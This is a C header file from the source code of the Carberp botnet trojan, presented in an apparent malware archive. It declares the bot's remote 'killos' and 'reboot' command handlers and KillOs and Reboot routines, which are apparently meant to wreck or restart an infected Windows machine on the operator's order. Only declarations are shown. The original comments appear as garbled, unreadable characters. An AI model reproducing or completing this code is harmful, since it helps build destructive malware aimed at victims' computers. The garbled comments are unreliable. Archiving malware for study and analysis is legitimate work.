/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef KillOs_RebootH
#define KillOs_RebootH
#include <windows.h>


	const PCHAR killos = "killos";
	const PCHAR Reboot_System = "reboot";
	
	// �������������� ������� ������, � ��� ���������� ������� ��������  
	bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);
	// �����������
	bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);

	bool KillOs();
	void Reboot();
#endif